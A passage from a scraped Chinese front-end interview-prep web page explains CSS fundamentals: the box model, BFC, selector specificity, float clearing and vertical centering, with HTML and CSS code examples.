href="/FE-Interview-Questions/docs/base/high-frequency.html#给一个数组-找出其中和为n的两个元素-两数之和" class="sidebar-link">给一个数组，找出其中和为n的两个元素（两数之和）</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现二分查找并分析时间复杂度" class="sidebar-link">实现二分查找并分析时间复杂度</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现队列功能" class="sidebar-link">实现队列功能</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写判断一个字符串-a-b-c-d-e-f-是否括号匹配" class="sidebar-link">手写判断一个字符串&quot;{a(b[c]d)e}f&quot;是否括号匹配</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_14-开放问题" class="sidebar-link">14 开放问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#面试结束面试官问你想了解什么" class="sidebar-link">面试结束面试官问你想了解什么</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#工作中遇到过哪些项目难点-是如何解决的-2" class="sidebar-link">工作中遇到过哪些项目难点，是如何解决的</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#你未来发展怎么规划的" class="sidebar-link">你未来发展怎么规划的</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#你期望加入一家什么样的公司" class="sidebar-link">你期望加入一家什么样的公司</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#平常除了开发还会做什么" class="sidebar-link">平常除了开发还会做什么？</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#工作中遇到比较大的挑战" class="sidebar-link">工作中遇到比较大的挑战</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#怎么看待加班" class="sidebar-link">怎么看待加班</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#你最大的缺点" class="sidebar-link">你最大的缺点</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#你觉得你有哪些不足之处" class="sidebar-link">你觉得你有哪些不足之处</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#谈薪技巧" class="sidebar-link">谈薪技巧</a></li></ul></li></ul></li><li><a href="/FE-Interview-Questions/docs/base/handwritten.html" class="sidebar-link">手写篇</a></li><li><a href="/FE-Interview-Questions/docs/base/comprehensive.html" class="sidebar-link">综合题型</a></li><li><a href="/FE-Interview-Questions/docs/base/other-questions.html" class="sidebar-link">其他问题</a></li><li><a href="/FE-Interview-Questions/docs/base/design-pattern.html" class="sidebar-link">设计模式</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>精选模块</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <main class="page"> <div id="container" class="theme-default-content l"><div class="content__default"><blockquote><p>一天快速复习完高频面试题</p></blockquote> <h2 id="_1-css"><a href="#_1-css" class="header-anchor">#</a> 1 CSS</h2> <h3 id="盒模型"><a href="#盒模型" class="header-anchor">#</a> 盒模型</h3> <blockquote><ul><li>有两种， <code>IE</code>盒子模型、<code>W3C</code>盒子模型；</li> <li>盒模型： 内容(<code>content</code>)、填充(<code>padding</code>)、边界(<code>margin</code>)、 边框(<code>border</code>)；</li> <li>区  别： <code>IE</code>的<code>content</code>部分把 <code>border</code> 和 <code>padding</code>计算了进去;</li></ul></blockquote> <p><strong>标准盒子模型的模型图</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/5c302a15e52c1b08.png" loading="lazy" class="lazy"></p> <p>从上图可以看到：</p> <ul><li>盒子总宽度 = <code>width</code> + <code>padding</code> + <code>border</code> + <code>margin</code>;</li> <li>盒子总高度 = <code>height</code> + <code>padding</code> + <code>border</code> + <code>margin</code></li></ul> <p>也就是，<code>width/height</code> 只是内容高度，不包含 <code>padding</code> 和 <code>border</code> 值</p> <p><strong>IE 怪异盒子模型</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/55340636fa7cdcee.png" loading="lazy" class="lazy"></p> <p>从上图可以看到：</p> <ul><li>盒子总宽度 = <code>width</code> + <code>margin</code>;</li> <li>盒子总高度 = <code>height</code> + <code>margin</code>;</li></ul> <p>也就是，<code>width/height</code> 包含了 <code>padding</code> 和 <code>border</code>值</p> <blockquote><p>页面渲染时，<code>dom</code> 元素所采用的 布局模型。可通过<code>box-sizing</code>进行设置</p></blockquote> <p><strong>通过 box-sizing 来改变元素的盒模型</strong></p> <p>CSS 中的 <code>box-sizing</code> 属性定义了引擎应该如何计算一个元素的总宽度和总高度</p> <ul><li><code>box-sizing: content-box;</code>  默认的标准(W3C)盒模型元素效果，元素的 <code>width/height</code> 不包含<code>padding</code>，<code>border</code>，与标准盒子模型表现一致</li> <li><code>box-sizing: border-box;</code>   触发怪异(IE)盒模型元素的效果，元素的 <code>width/height</code> 包含 <code>padding</code>，<code>border</code>，与怪异盒子模型表现一致</li> <li><code>box-sizing: inherit;</code>      继承父元素 <code>box-sizing</code> 属性的值</li></ul> <p><strong>小结</strong></p> <ul><li>盒子模型构成：内容(<code>content</code>)、内填充(<code>padding</code>)、 边框(<code>border</code>)、外边距(<code>margin</code>)</li> <li><code>IE8</code>及其以下版本浏览器，未声明 <code>DOCTYPE</code>，内容宽高会包含内填充和边框，称为怪异盒模型(<code>IE</code>盒模型)</li> <li>标准(<code>W3C</code>)盒模型：元素宽度 = <code>width + padding + border + margin</code></li> <li>怪异(<code>IE</code>)盒模型：元素宽度 = <code>width + margin</code></li> <li>标准浏览器通过设置 css3 的 <code>box-sizing: border-box</code> 属性，触发“怪异模式”解析计算宽高</li></ul> <h3 id="bfc"><a href="#bfc" class="header-anchor">#</a> BFC</h3> <blockquote><p>块级格式化上下文，是一个独立的渲染区域，让处于 <code>BFC</code> 内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响。</p></blockquote> <blockquote><p><code>IE</code>下为 <code>Layout</code>，可通过 <code>zoom:1</code> 触发</p></blockquote> <p><strong>触发条件:</strong></p> <ul><li>根元素，即HTML元素</li> <li>绝对定位元素 <code>position: absolute/fixed</code></li> <li>行内块元素 <code>display</code>的值为<code>inline-block</code>、<code>table</code>、<code>flex</code>、<code>inline-flex</code>、<code>grid</code>、<code>inline-grid</code></li> <li>浮动元素：<code>float</code>值为<code>left</code>、<code>right</code></li> <li><code>overflow值</code>不为 <code>visible</code>，为 <code>auto</code>、<code>scroll</code>、<code>hidden</code></li></ul> <p><strong>规则:</strong></p> <ol><li>属于同一个 <code>BFC</code> 的两个相邻 <code>Box</code> 垂直排列</li> <li>属于同一个 <code>BFC</code> 的两个相邻 <code>Box</code> 的 <code>margin</code> 会发生重叠</li> <li><code>BFC</code> 中子元素的 <code>margin box</code> 的左边， 与包含块 (BFC) <code>border box</code>的左边相接触 (子元素 <code>absolute</code> 除外)</li> <li><code>BFC</code> 的区域不会与 <code>float</code> 的元素区域重叠</li> <li>计算 <code>BFC</code> 的高度时，浮动子元素也参与计算</li> <li>文字层不会被浮动层覆盖，环绕于周围</li></ol> <p><strong>应用:</strong></p> <ul><li>利用<code>2</code>：阻止<code>margin</code>重叠</li> <li>利用<code>4</code>：自适应两栏布局</li> <li>利用 <code>5</code> ，可以避免高度塌陷</li> <li>可以包含浮动元素 —— 清除内部浮动(清除浮动的原理是两个<code>div</code>都位于同一个 <code>BFC</code> 区域之中)</li></ul> <p><strong>示例</strong></p> <p><strong>1. 防止margin重叠（塌陷）</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">p</span> <span class="token punctuation">{</span>
      <span class="token property">color</span><span class="token punctuation">:</span> #f55<span class="token punctuation">;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> #fcc<span class="token punctuation">;</span>
      <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
      <span class="token property">line-height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
      <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
      <span class="token property">margin</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Haha<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span> <span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hehe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span> <span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/d8f4f47649805c27.png" loading="lazy" class="lazy"></p> <ul><li>两个<code>p</code>元素之间的距离为<code>100px</code>，发生了<code>margin</code>重叠（塌陷），以最大的为准，如果第一个<code>P</code>的<code>margin</code>为<code>80</code>的话，两个<code>P</code>之间的距离还是<code>100</code>，以最大的为准。</li> <li>同一个<code>BFC</code>的俩个相邻的盒子的<code>margin</code>会发生重叠</li> <li>可以在<code>p</code>外面包裹一层容器，并触发这个容器生成一个<code>BFC</code>，那么两个<code>p</code>就不属于同一个<code>BFC</code>，则不会出现<code>margin</code>重叠</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.wrap</span> <span class="token punctuation">{</span>
        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>// 新的BFC
    <span class="token punctuation">}</span>
    <span class="token selector">p</span> <span class="token punctuation">{</span>
        <span class="token property">color</span><span class="token punctuation">:</span> #f55<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> #fcc<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Haha<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span> <span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>wrap<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hehe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span> <span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>这时候，边距则不会重叠：</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/5d6156d0fd00e6da.png" loading="lazy" class="lazy"></p> <p><strong>2. 清除内部浮动</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.par</span> <span class="token punctuation">{</span>
        <span class="token property">border</span><span class="token punctuation">:</span> 5px solid #fcc<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token selector">.child</span> <span class="token punctuation">{</span>
        <span class="token property">border</span><span class="token punctuation">:</span> 5px solid #f66<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span>100px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>par<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>child<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>child<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/f8eb06e196dd211b.png" loading="lazy" class="lazy"></p> <p>而<code>BFC</code>在计算高度时，浮动元素也会参与，所以我们可以触发<code>.par</code>元素生成<code>BFC</code>，则内部浮动元素计算高度时候也会计算</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.par</span> <span class="token punctuation">{</span>
    <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/32984028a445dbc7.png" loading="lazy" class="lazy"></p> <p><strong>3. 自适应多栏布局</strong></p> <p>这里举个两栏的布局</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">body</span> <span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token selector">.aside</span> <span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> #f66<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token selector">.main</span> <span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> #fcc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>aside<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/07acd0b2a466762f.png" loading="lazy" class="lazy"></p> <ul><li>每个元素的左外边距与包含块的左边界相接触</li> <li>因此，虽然<code>.aslide</code>为浮动元素，但是main的左边依然会与包含块的左边相接触，而<code>BFC</code>的区域不会与浮动盒子重叠</li> <li>所以我们可以通过触发<code>main</code>生成<code>BFC</code>，以此适应两栏布局</li></ul> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.main</span> <span class="token punctuation">{</span>
  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>这时候，新的<code>BFC</code>不会与浮动的<code>.aside</code>元素重叠。因此会根据包含块的宽度，和<code>.aside</code>的宽度，自动变窄</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/8749636e9068ae4a.png" loading="lazy" class="lazy"></p> <h3 id="选择器权重计算方式"><a href="#选择器权重计算方式" class="header-anchor">#</a> 选择器权重计算方式</h3> <blockquote><p>!important &gt; 内联样式 = 外联样式 &gt; ID选择器 &gt; 类选择器 = 伪类选择器 = 属性选择器 &gt; 元素选择器 = 伪元素选择器 &gt; 通配选择器 = 后代选择器 = 兄弟选择器</p></blockquote> <ol><li>属性后面加<code>!import</code>会覆盖页面内任何位置定义的元素样式</li> <li>作为<code>style</code>属性写在元素内的样式</li> <li><code>id</code>选择器</li> <li>类选择器</li> <li>标签选择器</li> <li>通配符选择器（<code>*</code>）</li> <li>浏览器自定义或继承</li></ol> <p><strong>同一级别：后写的会覆盖先写的</strong></p> <blockquote><p>css选择器的解析原则：选择器定位DOM元素是从右往左的方向，这样可以尽早的过滤掉一些不必要的样式规则和元素</p></blockquote> <h3 id="清除浮动"><a href="#清除浮动" class="header-anchor">#</a> 清除浮动</h3> <ol><li>在浮动元素后面添加 <code>clear:both</code>的空 <code>div</code> 元素</li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>left<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>right<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">clear</span><span class="token punctuation">:</span>both</span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ol start="2"><li>给父元素添加 <code>overflow:hidden</code> 或者 <code>auto</code> 样式，触发<code>BFC</code></li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>left<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>right<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.container</span><span class="token punctuation">{</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> #aaa<span class="token punctuation">;</span>
    <span class="token property">overflow</span><span class="token punctuation">:</span>hidden<span class="token punctuation">;</span>
    <span class="token property">zoom</span><span class="token punctuation">:</span>1<span class="token punctuation">;</span>   <span class="token comment">/*IE6*/</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="3"><li>使用伪元素，也是在元素末尾添加一个点并带有 <code>clear: both</code> 属性的元素实现的。</li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container clearfix<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>left<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>right<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.clearfix</span><span class="token punctuation">{</span>
    <span class="token property">zoom</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span> <span class="token comment">/*IE6*/</span>
<span class="token punctuation">}</span>
<span class="token selector">.clearfix:after</span><span class="token punctuation">{</span>
    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">&quot;.&quot;</span><span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
    <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
    <span class="token property">visibility</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><blockquote><p>推荐使用第三种方法，不会在页面新增div，文档结构更加清晰</p></blockquote> <h3 id="垂直居中的方案"><a href="#垂直居中的方案" class="header-anchor">#</a> 垂直居中的方案</h3> <ol><li><strong>利用绝对定位+transform</strong>，设置 <code>left: 50%</code>  和 <code>top: 50%</code>  现将子元素左上角移到父元素中心位置，然后再通过 <code>translate</code>  来调整子元素的中心点到父元素的中心。该方法可以<strong>不定宽高</strong></li></ol> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.father</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.son</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-50%<span class="token punctuation">,</span> -50%<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="2"><li><strong>利用绝对定位+margin:auto</strong>，子元素所有方向都为 <code>0</code> ，将 <code>margin</code>  设置为 <code>auto</code> ，由于宽高固定，对应方向实现平分，该方法必须<strong>盒子有宽高</strong></li></ol> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.father</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.son</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">bottom</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="3"><li><strong>利用绝对定位+margin:负值</strong>，设置 <code>left: 50%</code> 和 <code>top: 50%</code> 现将子元素左上角移到父元素中心位置，然后再通过 <code>margin-left</code>  和 <code>margin-top</code>  以子元素自己的一半宽高进行负值赋值。该方法必须定宽高</li></ol> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.father</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.son</span> <span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">margin-left</span><span class="token punctuation">:</span> -100px<span class="token punctuation">;</span>
  <span class="token property">margin-top</span><span class="token punctuation">:</span> -100px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="4"><li><strong>利用 flex</strong> ，最经典最方便的一种了，不用解释，<strong>定不定宽高无所谓</strong></li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.father</span> <span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
        <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
